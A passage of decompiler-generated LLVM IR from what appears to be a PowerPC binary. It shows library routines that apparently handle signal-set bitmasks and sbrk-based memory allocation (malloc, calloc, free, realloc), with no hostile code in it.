  uselistorder i32 ()* @function_10007df8, { 0, 3, 2, 1 }
}

define i32 @function_10008b98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008b98:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_10008bc8, label %dec_label_pc_10008bb4

dec_label_pc_10008bb4:                            ; preds = %dec_label_pc_10008b98
  %v0_10008bb4 = call i32 @function_10008484()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10008bc0 = inttoptr i32 %v0_10008bb4 to i32*
  store i32 22, i32* %v2_10008bc0, align 4
  %v0_10008bd4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008bd0

dec_label_pc_10008bc8:                            ; preds = %dec_label_pc_10008b98
  %v0_10008bc8 = call i32 @function_10008d18()
  store i32 %v0_10008bc8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008bd0

dec_label_pc_10008bd0:                            ; preds = %dec_label_pc_10008bb4, %dec_label_pc_10008bc8
  %v0_10008bd4 = phi i32 [ %v0_10008bd4.pre, %dec_label_pc_10008bb4 ], [ %v0_10008bc8, %dec_label_pc_10008bc8 ]
  ret i32 %v0_10008bd4

; uselistorder directives
  uselistorder label %dec_label_pc_10008bd0, { 1, 0 }
}

define i32 @function_10008be4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008be4:
  store i32 268471292, i32* @lr, align 4
  %v3_10008bf8 = call i32 @function_10008608(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @function_10008c10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008c10:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_10008c10 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_10008c10, label %dec_label_pc_10008c3c, label %dec_label_pc_10008c2c

dec_label_pc_10008c2c:                            ; preds = %dec_label_pc_10008c10
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_10008c3c, label %dec_label_pc_10008c34

dec_label_pc_10008c34:                            ; preds = %dec_label_pc_10008c2c
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_10008c6c.lr.ph, label %dec_label_pc_10008c3c

dec_label_pc_10008c3c:                            ; preds = %dec_label_pc_10008c34, %dec_label_pc_10008c2c, %dec_label_pc_10008c10
  %v0_10008c3c = call i32 @function_10008484()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10008c48 = inttoptr i32 %v0_10008c3c to i32*
  store i32 22, i32* %v2_10008c48, align 4
  %v0_10008cdc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008cd8

dec_label_pc_10008c6c.lr.ph:                      ; preds = %dec_label_pc_10008c34
  %v2_10008c5c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10008c5c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10008c6c22 = add i32 %v2_10008c5c, 128
  %v3_10008c6c23 = inttoptr i32 %v2_10008c6c22 to i32*
  store i32 0, i32* %v3_10008c6c23, align 4
  %v0_10008c7024 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008c7025 = add i32 %v0_10008c7024, -1
  store i32 %v1_10008c7025, i32* %r11.global-to-local, align 4
  %v1_10008c7426 = mul i32 %v1_10008c7025, 4
  %v1_10008c7827 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008c7828 = add i32 %v1_10008c7827, %v1_10008c7426
  store i32 %v2_10008c7828, i32* %r9.global-to-local, align 4
  %v0_10008c7c29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008c7c30 = add i32 %v0_10008c7c29, -1
  store i32 %v1_10008c7c30, i32* %ctr.global-to-local, align 4
  %v2_10008c7c31 = icmp eq i32 %v1_10008c7c30, 0
  br i1 %v2_10008c7c31, label %dec_label_pc_10008c80, label %dec_label_pc_10008c6c.dec_label_pc_10008c6c_crit_edge

dec_label_pc_10008c6c.dec_label_pc_10008c6c_crit_edge: ; preds = %dec_label_pc_10008c6c.lr.ph, %dec_label_pc_10008c6c.dec_label_pc_10008c6c_crit_edge
  %v2_10008c7832 = phi i32 [ %v2_10008c78, %dec_label_pc_10008c6c.dec_label_pc_10008c6c_crit_edge ], [ %v2_10008c7828, %dec_label_pc_10008c6c.lr.ph ]
  %v0_10008c6c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10008c6c = add i32 %v2_10008c7832, 4
  %v3_10008c6c = inttoptr i32 %v2_10008c6c to i32*
  store i32 %v0_10008c6c.pre, i32* %v3_10008c6c, align 4
  %v0_10008c70 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008c70 = add i32 %v0_10008c70, -1
  store i32 %v1_10008c70, i32* %r11.global-to-local, align 4
  %v1_10008c74 = mul i32 %v1_10008c70, 4
  %v1_10008c78 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008c78 = add i32 %v1_10008c78, %v1_10008c74
  store i32 %v2_10008c78, i32* %r9.global-to-local, align 4
  %v0_10008c7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008c7c = add i32 %v0_10008c7c, -1
  store i32 %v1_10008c7c, i32* %ctr.global-to-local, align 4
  %v2_10008c7c = icmp eq i32 %v1_10008c7c, 0
  br i1 %v2_10008c7c, label %dec_label_pc_10008c80, label %dec_label_pc_10008c6c.dec_label_pc_10008c6c_crit_edge

dec_label_pc_10008c80:                            ; preds = %dec_label_pc_10008c6c.dec_label_pc_10008c6c_crit_edge, %dec_label_pc_10008c6c.lr.ph
  %v0_10008c84.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_10008c80 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_10008c80, i32* @r3, align 4
  store i32 %v0_10008c84.pre, i32* @r4, align 4
  %v0_10008c88 = call i32 @function_10008d18()
  %v1_10008c8c = icmp slt i32 %v0_10008c88, 0
  br i1 %v1_10008c8c, label %dec_label_pc_10008cd4, label %dec_label_pc_10008c94

dec_label_pc_10008c94:                            ; preds = %dec_label_pc_10008c80
  %v0_10008c98 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008ca0 = call i32 @function_10008cf0(i32 ptrtoint (i32* @global_var_1001b4cc.369 to i32), i32 %v0_10008c98)
  %v2_10008cac = ptrtoint i32* %stack_var_-156 to i32
  store i32 268471492, i32* @lr, align 4
  %v4_10008cc0 = call i32 @function_1000a40c(i32 %v0_10008c98, i32* nonnull %stack_var_-296, i32 %v2_10008cac)
  %v1_10008cc4 = icmp slt i32 %v4_10008cc0, 0
  br i1 %v1_10008cc4, label %dec_label_pc_10008cd4, label %dec_label_pc_10008ccc

dec_label_pc_10008ccc:                            ; preds = %dec_label_pc_10008c94
  %v3_10008ccc = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_10008ccc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008cd8

dec_label_pc_10008cd4:                            ; preds = %dec_label_pc_10008c94, %dec_label_pc_10008c80
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008cd8

dec_label_pc_10008cd8:                            ; preds = %dec_label_pc_10008ccc, %dec_label_pc_10008c3c, %dec_label_pc_10008cd4
  %v0_10008cdc = phi i32 [ %v3_10008ccc, %dec_label_pc_10008ccc ], [ %v0_10008cdc.pre, %dec_label_pc_10008c3c ], [ -1, %dec_label_pc_10008cd4 ]
  ret i32 %v0_10008cdc

; uselistorder directives
  uselistorder i32 %v1_10008c7c, { 1, 0 }
  uselistorder i32 %v2_10008c78, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10008cd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008c6c.dec_label_pc_10008c6c_crit_edge, { 1, 0 }
}

define i32 @function_10008cf0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008cf0:
  %v1_10008cf0 = add i32 %arg2, -1
  %v1_10008cf4 = call i32 @__asm_rlwinm(i32 %v1_10008cf0, i32 29, i32 3, i32 29)
  %v1_10008cf8 = urem i32 %v1_10008cf0, 32
  %v2_10008cfc = add i32 %v1_10008cf4, %arg1
  %v3_10008cfc = inttoptr i32 %v2_10008cfc to i32*
  %v4_10008cfc = load i32, i32* %v3_10008cfc, align 4
  %v3_10008d04 = shl i32 1, %v1_10008cf8
  %v2_10008d08 = and i32 %v4_10008cfc, %v3_10008d04
  %v2_10008d0c = icmp ne i32 %v2_10008d08, 0
  %v5_10008d10 = zext i1 %v2_10008d0c to i32
  ret i32 %v5_10008d10
}

define i32 @function_10008d18() local_unnamed_addr {
dec_label_pc_10008d18:
  %r0.global-to-local = alloca i32, align 4
  %v0_10008d18 = load i32, i32* @r4, align 4
  %v1_10008d18 = add i32 %v0_10008d18, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10008d20 = call i32 @__asm_rlwinm(i32 %v1_10008d18, i32 29, i32 3, i32 29)
  %v1_10008d24 = urem i32 %v1_10008d18, 32
  %v1_10008d28 = load i32, i32* @r3, align 4
  %v2_10008d28 = add i32 %v1_10008d28, %v1_10008d20
  %v3_10008d28 = inttoptr i32 %v2_10008d28 to i32*
  %v4_10008d28 = load i32, i32* %v3_10008d28, align 4
  %v0_10008d2c = load i32, i32* %r0.global-to-local, align 4
  %v3_10008d2c = shl i32 %v0_10008d2c, %v1_10008d24
  store i32 %v3_10008d2c, i32* %r0.global-to-local, align 4
  %v2_10008d30 = or i32 %v3_10008d2c, %v4_10008d28
  store i32 %v2_10008d30, i32* %v3_10008d28, align 4
  ret i32 0
}

define i32 @function_10008d40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008d40:
  %v1_10008d40 = add i32 %arg2, -1
  %v1_10008d48 = call i32 @__asm_rlwinm(i32 %v1_10008d40, i32 29, i32 3, i32 29)
  %v1_10008d4c = urem i32 %v1_10008d40, 32
  %v2_10008d50 = add i32 %v1_10008d48, %arg1
  %v3_10008d50 = inttoptr i32 %v2_10008d50 to i32*
  %v4_10008d50 = load i32, i32* %v3_10008d50, align 4
  %v3_10008d54 = shl i32 -2, %v1_10008d4c
  %v4_10008d54 = sub nsw i32 32, %v1_10008d4c
  %v5_10008d54 = lshr i32 -2, %v4_10008d54
  %v6_10008d54 = or i32 %v5_10008d54, %v3_10008d54
  %v2_10008d58 = and i32 %v6_10008d54, %v4_10008d50
  store i32 %v2_10008d58, i32* %v3_10008d50, align 4
  ret i32 0
}

define i32 @function_10008d68() local_unnamed_addr {
dec_label_pc_10008d68:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10008d68 = load i32, i32* @r3, align 4
  %v3_10008d68 = icmp eq i32 %v0_10008d68, 0
  br i1 %v3_10008d68, label %dec_label_pc_10008d80, label %dec_label_pc_10008d84

dec_label_pc_10008d80:                            ; preds = %dec_label_pc_10008d68
  br label %dec_label_pc_10008d84

dec_label_pc_10008d84:                            ; preds = %dec_label_pc_10008d68, %dec_label_pc_10008d80
  %v0_10008d94 = phi i32 [ 1, %dec_label_pc_10008d80 ], [ %v0_10008d68, %dec_label_pc_10008d68 ]
  %v3_10008d88 = icmp ugt i32 %v0_10008d94, -8
  br i1 %v3_10008d88, label %dec_label_pc_10008e98, label %dec_label_pc_10008d90

dec_label_pc_10008d90:                            ; preds = %dec_label_pc_10008d84
  %v1_10008d94 = add i32 %v0_10008d94, 4
  store i32 ptrtoint (i32* @global_var_1001b304.370 to i32), i32* @r29, align 4
  store i32 %v1_10008d94, i32* %stack_var_-40, align 4
  %v0_10008da4 = call i32 @function_100098c4()
  %v2_10008dac = ptrtoint i32* %stack_var_-40 to i32
  %v3_10008db4 = call i32 @function_10009160(i32* inttoptr (i32 268546680 to i32*), i32 %v2_10008dac)
  store i32 %v3_10008db4, i32* %r31.global-to-local, align 4
  %v0_10008dc0 = call i32 @function_100098c4()
  %v3_10008dc4 = icmp eq i32 %v3_10008db4, 0
  br i1 %v3_10008dc4, label %dec_label_pc_10008dcc, label %dec_label_pc_10008e7c.thread

dec_label_pc_10008e7c.thread:                     ; preds = %dec_label_pc_10008d90
  br label %dec_label_pc_10008e90

dec_label_pc_10008dcc:                            ; preds = %dec_label_pc_10008d90
  %v3_10008dd0 = load i32, i32* @global_var_1001b2b0.374, align 4
  store i32 %v3_10008dd0, i32* %r31.global-to-local, align 4
  %v3_10008dd4 = load i32, i32* %stack_var_-40, align 4
  %v2_10008dd8 = icmp ult i32 %v3_10008dd4, %v3_10008dd0
  br i1 %v2_10008dd8, label %dec_label_pc_10008df0, label %dec_label_pc_10008de0

dec_label_pc_10008de0:                            ; preds = %dec_label_pc_10008dcc
  %v1_10008de4 = sub i32 0, %v3_10008dd0
  %v2_10008de0 = add i32 %v3_10008dd0, -1
  %v1_10008de8 = add i32 %v2_10008de0, %v3_10008dd4
  %v2_10008dec = and i32 %v1_10008de8, %v1_10008de4
  store i32 %v2_10008dec, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008df0

dec_label_pc_10008df0:                            ; preds = %dec_label_pc_10008dcc, %dec_label_pc_10008de0
  %v0_10008dfc = call i32 @function_100098c4()
  %v0_10008e00 = load i32, i32* %r31.global-to-local, align 4
  store i32 268471816, i32* @lr, align 4
  %v1_10008e04 = call i32 @function_1000a0e4(i32 %v0_10008e00)
  %v3_10008e08 = icmp eq i32 %v1_10008e04, -1
  br i1 %v3_10008e08, label %dec_label_pc_10008e28, label %dec_label_pc_10008e10

dec_label_pc_10008e10:                            ; preds = %dec_label_pc_10008df0
  %v1_10008e10 = add i32 %v1_10008e04, 3
  %v1_10008e14 = call i32 @__asm_rlwinm(i32 %v1_10008e10, i32 0, i32 0, i32 29)
  store i32 %v1_10008e14, i32* @r30, align 4
  %v4_10008e18 = icmp eq i32 %v1_10008e14, %v1_10008e04
  br i1 %v4_10008e18, label %dec_label_pc_10008e28, label %dec_label_pc_10008e20

dec_label_pc_10008e20:                            ; preds = %dec_label_pc_10008e10
  %v2_10008e20 = sub i32 %v1_10008e14, %v1_10008e04
  store i32 268471848, i32* @lr, align 4
  %v1_10008e24 = call i32 @function_1000a0e4(i32 %v2_10008e20)
  br label %dec_label_pc_10008e28

dec_label_pc_10008e28:                            ; preds = %dec_label_pc_10008e10, %dec_label_pc_10008df0, %dec_label_pc_10008e20
  %v0_10008e30 = call i32 @function_100098c4()
  %v0_10008e34 = load i32, i32* @r30, align 4
  %v3_10008e34 = icmp eq i32 %v0_10008e34, -1
  br i1 %v3_10008e34, label %dec_label_pc_10008e98, label %dec_label_pc_10008e7c

dec_label_pc_10008e7c:                            ; preds = %dec_label_pc_10008e28
  store i32 ptrtoint (i32* @global_var_1001b304.370 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001b278 to i32), i32* @r29, align 4
  %v0_10008e50 = call i32 @function_100098c4()
  %v0_10008e54 = load i32, i32* @r31, align 4
  %v0_10008e58 = load i32, i32* @r30, align 4
  %v0_10008e5c = load i32, i32* @r29, align 4
  store i32 268471908, i32* @lr, align 4
  %v3_10008e60 = inttoptr i32 %v0_10008e5c to i32*
  %v4_10008e60 = call i32 @function_100092e4(i32* %v3_10008e60, i32 %v0_10008e58, i32 %v0_10008e54)
  %v0_10008e64 = load i32, i32* @r29, align 4
  %v2_10008e6c = inttoptr i32 %v0_10008e64 to i32*
  %v3_10008e6c = call i32 @function_10009160(i32* %v2_10008e6c, i32 %v2_10008dac)
  store i32 %v3_10008e6c, i32* %r31.global-to-local, align 4
  %v0_10008e78 = call i32 @function_100098c4()
  %v3_10008e7c = icmp eq i32 %v3_10008e6c, 0
  br i1 %v3_10008e7c, label %dec_label_pc_10008e90.thread, label %dec_label_pc_10008e90

dec_label_pc_10008e90.thread:                     ; preds = %dec_label_pc_10008e7c
  br label %dec_label_pc_10008e98

dec_label_pc_10008e90:                            ; preds = %dec_label_pc_10008e7c, %dec_label_pc_10008e7c.thread
  %v0_10008e90.pr6 = phi i32 [ %v3_10008db4, %dec_label_pc_10008e7c.thread ], [ %v3_10008e6c, %dec_label_pc_10008e7c ]
  %v3_10008e84 = load i32, i32* %stack_var_-40, align 4
  %v2_10008e88 = inttoptr i32 %v0_10008e90.pr6 to i32*
  store i32 %v3_10008e84, i32* %v2_10008e88, align 4
  %v0_10008e8c = load i32, i32* %r31.global-to-local, align 4
  %v1_10008e8c = add i32 %v0_10008e8c, 4
  store i32 %v1_10008e8c, i32* @r31, align 4
  %v3_10008e90 = icmp eq i32 %v1_10008e8c, 0
  br i1 %v3_10008e90, label %dec_label_pc_10008e98, label %dec_label_pc_10008ea8

dec_label_pc_10008e98:                            ; preds = %dec_label_pc_10008e90.thread, %dec_label_pc_10008e90, %dec_label_pc_10008e28, %dec_label_pc_10008d84
  %v0_10008e98 = call i32 @function_10008484()
  %v2_10008ea0 = inttoptr i32 %v0_10008e98 to i32*
  store i32 12, i32* %v2_10008ea0, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10008ea8

dec_label_pc_10008ea8:                            ; preds = %dec_label_pc_10008e90, %dec_label_pc_10008e98
  %v0_10008eac = phi i32 [ %v1_10008e8c, %dec_label_pc_10008e90 ], [ 0, %dec_label_pc_10008e98 ]
  ret i32 %v0_10008eac

; uselistorder directives
  uselistorder i32 %v1_10008e8c, { 1, 0, 2 }
  uselistorder i32 %v1_10008e14, { 1, 0, 2 }
  uselistorder i32 %v1_10008e04, { 2, 0, 1, 3 }
  uselistorder i32 %v3_10008dd0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10008db4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_10008ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10008e98, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10008e28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008df0, { 1, 0 }
  uselistorder label %dec_label_pc_10008d84, { 1, 0 }
}

define i32 @function_10008ec0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008ec0:
  %v3_10008ec0 = icmp eq i32 %arg1, 0
  %v2_10008ed0 = mul i32 %arg2, %arg1
  store i32 %v2_10008ed0, i32* @r31, align 4
  br i1 %v3_10008ec0, label %dec_label_pc_10008efc, label %dec_label_pc_10008edc

dec_label_pc_10008edc:                            ; preds = %dec_label_pc_10008ec0
  %v2_10008edc = udiv i32 %v2_10008ed0, %arg1
  store i32 0, i32* @r30, align 4
  %v4_10008ee4 = icmp eq i32 %v2_10008edc, %arg2
  br i1 %v4_10008ee4, label %dec_label_pc_10008efc, label %dec_label_pc_10008eec

dec_label_pc_10008eec:                            ; preds = %dec_label_pc_10008edc
  %v0_10008eec = call i32 @function_10008484()
  %v2_10008ef4 = inttoptr i32 %v0_10008eec to i32*
  store i32 12, i32* %v2_10008ef4, align 4
  br label %dec_label_pc_10008f18

dec_label_pc_10008efc:                            ; preds = %dec_label_pc_10008edc, %dec_label_pc_10008ec0
  store i32 %v2_10008ed0, i32* @r3, align 4
  store i32 268472068, i32* @lr, align 4
  %v0_10008f00 = call i32 @function_10008d68()
  %v0_10008f04 = load i32, i32* @r31, align 4
  store i32 %v0_10008f00, i32* @r30, align 4
  %v3_10008f08 = icmp eq i32 %v0_10008f00, 0
  br i1 %v3_10008f08, label %dec_label_pc_10008f18, label %dec_label_pc_10008f14

dec_label_pc_10008f14:                            ; preds = %dec_label_pc_10008efc
  store i32 268472088, i32* @lr, align 4
  %v3_10008f14 = call i32 @function_10008608(i32 0, i32 %v0_10008f04, i32 %v0_10008f04)
  br label %dec_label_pc_10008f18

dec_label_pc_10008f18:                            ; preds = %dec_label_pc_10008efc, %dec_label_pc_10008eec, %dec_label_pc_10008f14
  %v0_10008f1c = load i32, i32* @r30, align 4
  ret i32 %v0_10008f1c

; uselistorder directives
  uselistorder i32 %v0_10008f04, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008f18, { 2, 0, 1 }
}

define i32 @function_10008f30() local_unnamed_addr {
dec_label_pc_10008f30:
  %v0_10008f30 = load i32, i32* @r3, align 4
  %v3_10008f30 = icmp eq i32 %v0_10008f30, 0
  br i1 %v3_10008f30, label %dec_label_pc_1000901c, label %dec_label_pc_10008f48

dec_label_pc_10008f48:                            ; preds = %dec_label_pc_10008f30
  %v1_10008f4c = add i32 %v0_10008f30, -4
  %v2_10008f4c = inttoptr i32 %v1_10008f4c to i32*
  %v3_10008f4c = load i32, i32* %v2_10008f4c, align 4
  store i32 %v3_10008f4c, i32* @r28, align 4
  store i32 268566528, i32* @r26, align 4
  %v0_10008f60 = call i32 @function_100098c4()
  %v0_10008f68 = load i32, i32* @r28, align 4
  store i32 268472180, i32* @lr, align 4
  %v4_10008f70 = call i32 @function_100092e4(i32* nonnull @global_var_1001b278, i32 %v1_10008f4c, i32 %v0_10008f68)
  %v3_10008f78 = load i32, i32* @global_var_1001b2b0.374, align 4
  store i32 %v4_10008f70, i32* @r29, align 4
  %v1_10008f80 = inttoptr i32 %v4_10008f70 to i32*
  %v2_10008f80 = load i32, i32* %v1_10008f80, align 4
  store i32 %v2_10008f80, i32* @r27, align 4
  %v1_10008f84 = mul i32 %v3_10008f78, 8
  %v2_10008f88 = icmp ult i32 %v2_10008f80, %v1_10008f84
  br i1 %v2_10008f88, label %dec_label_pc_10008fbc, label %dec_label_pc_10008f90

dec_label_pc_10008f90:                            ; preds = %dec_label_pc_10008f48
  store i32 ptrtoint (i32* @global_var_1001b54c.375 to i32), i32* @r28, align 4
  %v0_10008fa0 = call i32 @function_100098c4()
  store i32 268472236, i32* @lr, align 4
  %v1_10008fa8 = call i32 @function_1000a0e4(i32 0)
  %v0_10008fac = load i32, i32* @r31, align 4
  %v4_10008fac = icmp eq i32 %v0_10008fac, %v1_10008fa8
  br i1 %v4_10008fac, label %dec_label_pc_10008fc4, label %dec_label_pc_10008fb4

dec_label_pc_10008fb4:                            ; preds = %dec_label_pc_10008f90
  %v0_10008fb8 = call i32 @function_100098c4()
  br label %dec_label_pc_10008fbc

dec_label_pc_10008fbc:                            ; preds = %dec_label_pc_10008f48, %dec_label_pc_10008fb4
  br label %dec_label_pc_10009018

dec_label_pc_10008fc4:                            ; preds = %dec_label_pc_10008f90
  %v0_10008fc4 = load i32, i32* @r29, align 4
  %v1_10008fc4 = add i32 %v0_10008fc4, 4
  %v2_10008fc4 = inttoptr i32 %v1_10008fc4 to i32*
  %v3_10008fc4 = load i32, i32* %v2_10008fc4, align 4
  %v3_10008fc8 = icmp eq i32 %v3_10008fc4, 0
  br i1 %v3_10008fc8, label %dec_label_pc_10008fd8, label %dec_label_pc_10008fd0

dec_label_pc_10008fd0:                            ; preds = %dec_label_pc_10008fc4
  %v1_10008fd0 = add i32 %v0_10008fc4, 8
  %v2_10008fd0 = inttoptr i32 %v1_10008fd0 to i32*
  %v3_10008fd0 = load i32, i32* %v2_10008fd0, align 4
  %v2_10008fd4 = add i32 %v3_10008fc4, 8
  %v3_10008fd4 = inttoptr i32 %v2_10008fd4 to i32*
  store i32 %v3_10008fd0, i32* %v3_10008fd4, align 4
  %v0_10008fd8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10008fd8

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008fc4, %dec_label_pc_10008fd0
  %v0_10008fd8 = phi i32 [ %v0_10008fc4, %dec_label_pc_10008fc4 ], [ %v0_10008fd8.pre, %dec_label_pc_10008fd0 ]
  %v1_10008fd8 = add i32 %v0_10008fd8, 8
  %v2_10008fd8 = inttoptr i32 %v1_10008fd8 to i32*
  %v3_10008fd8 = load i32, i32* %v2_10008fd8, align 4
  %v1_10008fdc = add i32 %v0_10008fd8, 4
  %v2_10008fdc = inttoptr i32 %v1_10008fdc to i32*
  %v3_10008fdc = load i32, i32* %v2_10008fdc, align 4
  %v3_10008fe0 = icmp eq i32 %v3_10008fd8, 0
  br i1 %v3_10008fe0, label %dec_label_pc_10008ff0, label %dec_label_pc_10008fe8

dec_label_pc_10008fe8:                            ; preds = %dec_label_pc_10008fd8
  %v2_10008fe8 = add i32 %v3_10008fd8, 4
  %v3_10008fe8 = inttoptr i32 %v2_10008fe8 to i32*
  store i32 %v3_10008fdc, i32* %v3_10008fe8, align 4
  br label %dec_label_pc_10008ff4

dec_label_pc_10008ff0:                            ; preds = %dec_label_pc_10008fd8
  store i32 %v3_10008fdc, i32* @global_var_1001b278, align 4
  br label %dec_label_pc_10008ff4

dec_label_pc_10008ff4:                            ; preds = %dec_label_pc_10008fe8, %dec_label_pc_10008ff0
  %v0_10008ffc = call i32 @function_100098c4()
  %v0_10009000 = load i32, i32* @r27, align 4
  %v1_10009000 = load i32, i32* @r29, align 4
  %v0_10009008 = load i32, i32* @r31, align 4
  %v2_10009000 = sub i32 12, %v0_10009000
  %v1_10009004 = add i32 %v2_10009000, %v1_10009000
  %v2_10009008 = sub i32 %v1_10009004, %v0_10009008
  store i32 268472336, i32* @lr, align 4
  %v1_1000900c = call i32 @function_1000a0e4(i32 %v2_10009008)
  br label %dec_label_pc_10009018

dec_label_pc_10009018:                            ; preds = %dec_label_pc_10008fbc, %dec_label_pc_10008ff4
  %v0_10009018 = call i32 @function_100098c4()
  br label %dec_label_pc_1000901c

dec_label_pc_1000901c:                            ; preds = %dec_label_pc_10008f30, %dec_label_pc_10009018
  %.0 = phi i32 [ undef, %dec_label_pc_10008f30 ], [ %v0_10009018, %dec_label_pc_10009018 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_10008fd8, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_1000a0e4, { 3, 2, 1, 0 }
  uselistorder i32* @r26, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000901c, { 1, 0 }
  uselistorder label %dec_label_pc_10009018, { 1, 0 }
  uselistorder label %dec_label_pc_10008ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10008fd8, { 1, 0 }
  uselistorder label %dec_label_pc_10008fbc, { 1, 0 }
}

define i32 @function_10009030(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009030:
  %r27.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v3_10009030 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_10009030, label %dec_label_pc_1000904c, label %dec_label_pc_10009058

dec_label_pc_1000904c:                            ; preds = %dec_label_pc_10009030
  store i32 ptrtoint ([3 x i8]* @global_var_10009050.379 to i32), i32* @lr, align 4
  %v0_1000904c = call i32 @function_10008f30()
  br label %dec_label_pc_10009064

dec_label_pc_10009058:                            ; preds = %dec_label_pc_10009030
  %v3_10009058 = icmp eq i32 %arg1, 0
  br i1 %v3_10009058, label %dec_label_pc_10009064, label %dec_label_pc_10009070

dec_label_pc_10009064:                            ; preds = %dec_label_pc_10009058, %dec_label_pc_1000904c
  %storemerge = phi i32 [ 0, %dec_label_pc_1000904c ], [ %arg2, %dec_label_pc_10009058 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268472424, i32* @lr, align 4
  %v0_10009064 = call i32 @function_10008d68()
  store i32 %v0_10009064, i32* @r28, align 4
  br label %dec_label_pc_10009148

dec_label_pc_10009070:                            ; preds = %dec_label_pc_10009058
  %v1_10009070 = add i32 %arg2, 7
  %v1_10009074 = add i32 %arg1, -4
  store i32 %v1_10009074, i32* %r27.global-to-local, align 4
  %v1_10009078 = call i32 @__asm_rlwinm(i32 %v1_10009070, i32 0, i32 0, i32 29)
  store i32 %v1_10009078, i32* @r31, align 4
  %v2_1000907c = inttoptr i32 %v1_10009074 to i32*
  %v3_1000907c = load i32, i32* %v2_1000907c, align 4
  store i32 %v3_1000907c, i32* @r30, align 4
  %v2_10009080 = icmp ugt i32 %v1_10009078, 11
  br i1 %v2_10009080, label %dec_label_pc_1000908c, label %dec_label_pc_10009088

dec_label_pc_10009088:                            ; preds = %dec_label_pc_10009070
  store i32 12, i32* @r31, align 4
  br label %dec_label_pc_1000908c

dec_label_pc_1000908c:                            ; preds = %dec_label_pc_10009070, %dec_label_pc_10009088
  %v0_1000910c = phi i32 [ %v1_10009078, %dec_label_pc_10009070 ], [ 12, %dec_label_pc_10009088 ]
  %v3_1000908c = icmp ugt i32 %v0_1000910c, %v3_1000907c
  br i1 %v3_1000908c, label %dec_label_pc_10009094, label %dec_label_pc_1000910c

dec_label_pc_10009094:                            ; preds = %dec_label_pc_1000908c
  store i32 ptrtoint (i32* @global_var_1001b304.370 to i32), i32* @r29, align 4
